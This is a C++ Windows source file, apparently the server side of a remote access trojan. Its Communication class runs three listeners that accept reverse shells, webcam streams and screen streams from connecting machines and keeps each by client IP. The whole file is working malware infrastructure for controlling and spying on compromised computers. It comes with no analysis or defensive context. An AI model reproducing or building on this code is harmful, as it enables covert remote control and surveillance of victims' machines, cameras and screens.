#include "Communication.h"

Communication::Communication(short revshell_port, short camera_port, short screen_port)
    : _revshell_port(revshell_port), _camera_port(camera_port), _screen_port(screen_port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("WSAStartup failed");
    }
}

Communication::~Communication() {
    WSACleanup();
}

SOCKET Communication::createServerSocket(short port) {
    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (serverSocket == INVALID_SOCKET) {
        throw std::runtime_error("Communication::createServerSocket() - socket");
    }

    sockaddr_in sa = { 0 };
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        throw std::runtime_error("Communication::createServerSocket() - bind");
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        throw std::runtime_error("Communication::createServerSocket() - listen");
    }

    return serverSocket;
}

void Communication::acceptClients() {
    thread shellThread(&Communication::acceptShell, this);
    thread cameraThread(&Communication::acceptCamera, this);
    thread screenThread(&Communication::acceptScreens, this);

    shellThread.join();
    cameraThread.join();
    screenThread.join();
}

void Communication::acceptShell() {
    SOCKET serverSocket = createServerSocket(_revshell_port);
    unsigned int id = 1000;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);

        _rev_shells[id] = { clientSocket , getIP(clientSocket)};

        if (clientSocket == INVALID_SOCKET) {
            throw std::runtime_error("Communication::acceptShell() - accept");
        }

        id++;
    }
}

void Communication::acceptCamera() {
    SOCKET serverSocket = createServerSocket(_camera_port);

    unsigned int id = 1000;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);

        _cameras[id] = { clientSocket , getIP(clientSocket) };

        if (clientSocket == INVALID_SOCKET) {
            throw std::runtime_error("Communication::acceptCamera() - accept");
        }

        id++;
    }
}

void Communication::acceptScreens() {
    SOCKET serverSocket = createServerSocket(_screen_port);

    unsigned int id = 1000;

    while (true) {
        SOCKET clientSocket = accept(serverSocket, nullptr, nullptr);

        _screens[id] = { clientSocket , getIP(clientSocket) };

        if (clientSocket == INVALID_SOCKET) {
            throw std::runtime_error("Communication::acceptCamera() - accept");
        }

        id++;
    }
}

string Communication::getIP(SOCKET socket) {
    sockaddr_in addr;
    int addr_len = sizeof(addr);

    // Get the peer name (address) of the connected socket
    if (getpeername(socket, (sockaddr*)&addr, &addr_len) == SOCKET_ERROR) {
        std::cerr << "getpeername failed: " << WSAGetLastError() << std::endl;
        return "";
    }

    char ip[INET_ADDRSTRLEN];
    // Convert the IP address to a string
    inet_ntop(AF_INET, &(addr.sin_addr), ip, INET_ADDRSTRLEN);

    return std::string(ip);
}

map<unsigned int, tuple<SOCKET, string>> Communication::getRevShells(){
    return _rev_shells;
}

map<unsigned int, tuple<SOCKET, string>> Communication::getCameras(){
    return _cameras;
}

map<unsigned int, tuple<SOCKET, string>> Communication::getScreens() {
    return _screens;
}